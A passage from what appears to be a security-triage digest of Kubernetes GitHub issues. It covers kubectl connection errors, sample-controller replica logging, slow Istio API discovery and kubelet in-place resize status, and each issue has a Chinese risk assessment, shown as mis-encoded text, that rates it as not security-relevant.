$ kubectl version
# paste output here
```
v1.28.1
</details>


#### Cloud provider

<details>
na
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubeletåœ¨æ‹‰èµ·Podæ—¶è€—æ—¶è¶…è¿‡10åˆ†é’Ÿï¼Œæ€€ç–‘`findAndAddNewPods()`æ–¹æ³•ä¸­çš„`dswp.podManager.GetPods()`æœªè·å–åˆ°å¯¹åº”çš„Podï¼Œå¯èƒ½å­˜åœ¨é”è·å–çš„é—®é¢˜ï¼Œå¯¼è‡´`waitForVolumeAttach`å¯åŠ¨ç¼“æ…¢ã€‚è¿™æ˜¯ä¸€ä¸ªæ€§èƒ½é—®é¢˜ï¼Œå¯èƒ½å½±å“ç³»ç»Ÿçš„æ•ˆç‡å’Œç¨³å®šæ€§ã€‚ä½†æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼š**å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚å› æ­¤ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #129014 About `The connection to the server localhost:8080 was refused - did you specify the right host or port?`

- Issue é“¾æ¥ï¼š[#129014](https://github.com/kubernetes/kubernetes/issues/129014)

### Issue å†…å®¹

#### What happened?

Overall, after executing `kubeadm init` on the master and joining the cluster on node1, executing `kubectl get pods` shows:
```
[root@master ~]# kubectl get pods   
E1128 11:13:17.569545   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.569946   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.573246   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.574176   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.579695   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

#### What did you expect to happen?

Overall, after executing `kubeadm init` on the master and joining the cluster on node1, executing `kubectl get pods` shows:
```
[root@master ~]# kubectl get pods   
E1128 11:13:17.569545   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.569946   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.573246   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.574176   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.579695   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

#### How can we reproduce it (as minimally and precisely as possible)?

Normal installation of k8s, initializing the master and adding node1 to the cluster

#### Anything else we need to know?

I am from Chinaï¼ˆenglish badğŸ™ï¼‰, so I used a mirror source to pull
The k8s and docker packages are pulled using a proxy:
```
cat > /etc/yum.repos.d/kubernetes.repo << EOF
[kubernetes]
name=Kubernetes
baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/
enabled=1
gpgcheck=1
repo_gpgcheck=1
gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg
EOF
```

#### Kubernetes version

<details>

```console
[root@master ~]# kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
VMware worstation
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
[root@master ~]# cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.2 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.2"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.2 (Blue Onyx)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:9::baseos"
HOME_URL="https://rockylinux.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.2"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.2"
$ uname -a
[root@master ~]# uname -a
Linux master 5.14.0-284.11.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May 9 17:09:15 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
yum / dnf
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
[root@master ~]# containerd version
INFO[2024-11-28T11:20:37.912365123+08:00] starting containerd                           revision=57f17b0a6295a39009d861b89e3b3b87b005ca27 version=1.7.23
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»æä¾›çš„Issueå†…å®¹æ¥çœ‹ï¼Œç”¨æˆ·åœ¨æ‰§è¡Œ`kubectl get pods`æ—¶ï¼Œå‡ºç°äº†`The connection to the server localhost:8080 was refused - did you specify the right host or port?`çš„é”™è¯¯ã€‚è¿™é€šå¸¸æ˜¯ç”±äºKuberneteså®¢æˆ·ç«¯æœªæ­£ç¡®é…ç½®ä¸APIæœåŠ¡å™¨çš„è¿æ¥ï¼Œæˆ–è€…ç¼ºå°‘å¿…è¦çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚`~/.kube/config`ï¼‰æ‰€å¯¼è‡´çš„ã€‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„é…ç½®é—®é¢˜ï¼Œä¸å®‰å…¨é£é™©æ— å…³ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueæ²¡æœ‰æåŠä»»ä½•å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¸å­˜åœ¨é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #129012 The current and desired number of replicas in the sample controller is incorrect.

- Issue é“¾æ¥ï¼š[#129012](https://github.com/kubernetes/kubernetes/issues/129012)

### Issue å†…å®¹

#### What happened?

The current and desired number of replicas in the sample controller is incorrect.

`Say, we have the replicas of the crd start with 1 and change to 2.`

we got this:
`"Update deployment resource" objectRef="default/example-foo" currentReplicas=2 desiredReplicas=1`

![image](https://github.com/user-attachments/assets/536045c1-74e5-4321-83f9-6074fa878751)


#### What did you expect to happen?

When updating the replicas of the crd and the log level set to 4, the log should show `current 1, desired 2`.



#### How can we reproduce it (as minimally and precisely as possible)?

- Run sample controller and set log level to 4
- Apply crd.yaml and `example-foo.yaml` file in artifacts folder
- Change the replicas of `example-foo.yaml` from 1 to 2 and apply the changes


#### Anything else we need to know?

_No response_

#### Kubernetes version
<details>
```console
$ kubectl version
v1.28.1
```

</details>


#### Cloud provider

<details>
Local cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œè¿™æ˜¯ä¸€ä¸ªå…³äºSample Controlleråœ¨æ›´æ–°CRDï¼ˆè‡ªå®šä¹‰èµ„æºå®šä¹‰ï¼‰æ—¶ï¼Œå½“å‰å’ŒæœŸæœ›çš„å‰¯æœ¬æ•°æ˜¾ç¤ºä¸æ­£ç¡®çš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“å°†CRDçš„å‰¯æœ¬æ•°ä»1æ›´æ”¹ä¸º2æ—¶ï¼Œæ—¥å¿—ä¸­æ˜¾ç¤ºçš„currentReplicaså’ŒdesiredReplicasä¸é¢„æœŸä¸ç¬¦ã€‚è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é”™è¯¯æˆ–æ—¥å¿—æ˜¾ç¤ºé”™è¯¯ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜å¹¶ä¸èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥å®æ–½æ”»å‡»ï¼Œä¸ç¬¦åˆæ ‡å‡†1ã€‚
2. æ²¡æœ‰è¿¹è±¡è¡¨æ˜è¯¥é—®é¢˜å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œä¹Ÿä¸æ¶‰åŠCVSSè¯„åˆ†ï¼Œä¸ç¬¦åˆæ ‡å‡†2ã€‚
3. è¯¥é—®é¢˜ä¸æ˜¯ç”±äºIssueæäº¤è€…çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–ä¸å½“æ“ä½œå¯¼è‡´ï¼Œæ ‡å‡†3ä¸é€‚ç”¨ã€‚
4. è¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œæ ‡å‡†4ä¸é€‚ç”¨ã€‚
5. ä¸æ¶‰åŠå‡­æ®æ³„éœ²ï¼Œæ ‡å‡†5ä¸é€‚ç”¨ã€‚
6. æ ¹æ®æ ‡å‡†6ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #129001 failed to get api resources with kubectl 1.30

- Issue é“¾æ¥ï¼š[#129001](https://github.com/kubernetes/kubernetes/issues/129001)

### Issue å†…å®¹

#### What happened?

we installed Istio CRD within standard container to perform some upgrade test, mainly the installation below CRD 

```
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: fortio
spec:
  hosts:
  - '*'
  gateways:
  - fortio-gateway
  http:
  - route:
    - destination:
        host: fortio
        port:
          number: 8080
---
apiVersion: networking.istio.io/v1alpha3
kind: Gateway
metadata:
  name: fortio-gateway
spec:
  selector:
    istio: ingressgateway
  servers:
  - hosts:
    - '*'
    port:
      name: http
      number: 80
      protocol: HTTP`
```

it depends on the api resources to be available, while the default kubelctl is 1.30, it does not list the api-resources with "Istio"
```
bash-4.4$ kubectl api-resources |grep istio
bash-4.4$ 
```
while if I change to use a 1.29 kubectl, it will list the istio api-resources; then I run with 1.30 kubectl again, it can get the Istio api resources as well. But if I don't run the 1.29 kubect, we kee retry, it take 10 + mins to get the Istio api -resources using 1.30 kubectl. 


```
bash-4.4$ /tmp/kubectl.129 api-resources |grep istio
adapters                                         config.istio.io/v1alpha2          true         adapter
attributemanifests                               config.istio.io/v1alpha2          true         attributemanifest
handlers                                         config.istio.io/v1alpha2          true         handler
httpapispecbindings                              config.istio.io/v1alpha2          true         HTTPAPISpecBinding
httpapispecs                                     config.istio.io/v1alpha2          true         HTTPAPISpec
instances                                        config.istio.io/v1alpha2          true         instance
quotaspecbindings                                config.istio.io/v1alpha2          true         QuotaSpecBinding
quotaspecs                                       config.istio.io/v1alpha2          true         QuotaSpec
rules                                            config.istio.io/v1alpha2          true         rule
templates                                        config.istio.io/v1alpha2          true         template
wasmplugins                                      extensions.istio.io/v1alpha1      true         WasmPlugin
destinationrules                    dr           networking.istio.io/v1beta1       true         DestinationRule
envoyfilters                                     networking.istio.io/v1alpha3      true         EnvoyFilter
gateways                            gw           networking.istio.io/v1beta1       true         Gateway
proxyconfigs                                     networking.istio.io/v1beta1       true         ProxyConfig
serviceentries                      se           networking.istio.io/v1beta1       true         ServiceEntry
sidecars                                         networking.istio.io/v1beta1       true         Sidecar
virtualservices                     vs           networking.istio.io/v1beta1       true         VirtualService
workloadentries                     we           networking.istio.io/v1beta1       true         WorkloadEntry
workloadgroups                      wg           networking.istio.io/v1beta1       true         WorkloadGroup
rbacconfigs                                      rbac.istio.io/v1alpha1            true         RbacConfig
servicerolebindings                              rbac.istio.io/v1alpha1            true         ServiceRoleBinding
serviceroles                                     rbac.istio.io/v1alpha1            true         ServiceRole
authorizationpolicies                            security.istio.io/v1beta1         true         AuthorizationPolicy
peerauthentications                 pa           security.istio.io/v1beta1         true         PeerAuthentication
requestauthentications              ra           security.istio.io/v1beta1         true         RequestAuthentication
telemetries                         telemetry    telemetry.istio.io/v1alpha1       true         Telemetry
```


#### What did you expect to happen?

There shall be no delay of 10+ mins by using the 1.30 kubectl to get the api resoures

#### How can we reproduce it (as minimally and precisely as possible)?

1. running from docker container
```
docker --version
Docker version 24.0.7, build 24.0.7-0ubuntu2~22.04.1
```
2. install Istio api-resources
3. using 1.30 kubectl to get the Istio api -resources
```
kubectl api-resources |grep istio
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.1

```

</details>


#### Cloud provider

<details>
Kubeadm brought up cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œç”¨æˆ·åœ¨å®‰è£…äº†Istioçš„CRDåï¼Œä½¿ç”¨1.30ç‰ˆæœ¬çš„kubectlæ— æ³•ç«‹å³è·å–åˆ°Istioçš„APIèµ„æºï¼Œè€Œä½¿ç”¨1.29ç‰ˆæœ¬çš„kubectlå¯ä»¥æ­£å¸¸è·å–ã€‚ç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œ1.30ç‰ˆæœ¬çš„kubectlä¹Ÿå¯ä»¥è·å–åˆ°Istioçš„APIèµ„æºã€‚è¯¥é—®é¢˜æè¿°äº†kubectlåœ¨ä¸åŒç‰ˆæœ¬ä¸‹è·å–CRDèµ„æºçš„è¡Œä¸ºå·®å¼‚ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueæœªæ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œæœªæè¿°ä»»ä½•å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚

---

## Issue #128993 [InPlacePodVerticalScaling]kubelet sometimes set `.status.resize` incorrectly

- Issue é“¾æ¥ï¼š[#128993](https://github.com/kubernetes/kubernetes/issues/128993)

### Issue å†…å®¹

#### What happened?

In cluster which enable InPlacePodVerticalScaling, If I only resize resources, I will watch `.status.resize` and `.status.containerStatuses[x].resources` to know whether the resize progress.

I have encountered some corner cases that are difficult to consistently reproduce:
1. User changes cpu request from 200m to 100m
2. Kubelet set  `.status.resize` to `InProgress`
3. Kubelet set `.status.resize` to be nil and set `.status.containerStatuses[x].resources` to be 100m
4. Kubelet set `.status.resize` to be `InProgress` and set `.status.containerStatuses[x].resources` to be 200m
5. finally,  Kubelet set `.status.resize` to be nil and set `.status.containerStatuses[x].resources` to be 100m again

#### What did you expect to happen?

Under normal circumstances, steps 4 and 5 should not take place.

I have discovered some relevant information in the Kubelet logs.

// step 2
```log
Nov 12 10:15:53 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:53.062599   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"1\",\"memory\":\"1Gi\"},\"requests\":{\"cpu\":\"200m\",\"memory\":\"200Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":\"InProgress\"}}"
Nov 12 10:15:53 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:53.062635   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=3 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"1","memory":"1Gi"},"requests":{"cpu":"200m","memory":"200Mi"}}}],"qosClass":"Burstable","resize":"InProgress"}
```

// step 3

```
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.056885   12114 kuberuntime_manager.go:1051] "computePodActions got for pod" podActions="KillPod: false, CreateSandbox: false, UpdatePodResources: false, Attempt: 0, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.067151   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"800m\",\"memory\":\"800Mi\"},\"requests\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":null}}"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.067191   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=4 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"800m","memory":"800Mi"},"requests":{"cpu":"100m","memory":"100Mi"}}}],"qosClass":"Burstable"}
```


// step 4
```
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.081966   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"1\",\"memory\":\"1Gi\"},\"requests\":{\"cpu\":\"200m\",\"memory\":\"200Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":\"InProgress\"}}"
Nov 12 10:15:54 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:54.081998   12114 status_manager.go:883] "Status for pod updated successfully" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" statusVersion=5 status={"phase":"Running","conditions":[{"type":"KruisePodReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"InPlaceUpdateReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:51Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2024-11-12T02:15:50Z"}],"hostIP":"172.21.154.57","hostIPs":[{"ip":"172.21.154.57"}],"podIP":"172.21.154.96","podIPs":[{"ip":"172.21.154.96"}],"startTime":"2024-11-12T02:15:50Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2024-11-12T02:15:50Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine","imageID":"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128","containerID":"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb","started":true,"allocatedResources":{"cpu":"100m","memory":"100Mi"},"resources":{"limits":{"cpu":"1","memory":"1Gi"},"requests":{"cpu":"200m","memory":"200Mi"}}}],"qosClass":"Burstable","resize":"InProgress"}
```


// step5
```
Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.052256   12114 kuberuntime_manager.go:1051] "computePodActions got for pod" podActions="KillPod: false, CreateSandbox: false, UpdatePodResources: false, Attempt: 0, InitContainersToStart: [], ContainersToStart: [], EphemeralContainersToStart: [],ContainersToUpdate: map[], ContainersToKill: map[]" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn"
Nov 12 10:15:55 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:55.067675   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"800m\",\"memory\":\"800Mi\"},\"requests\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":null}}"
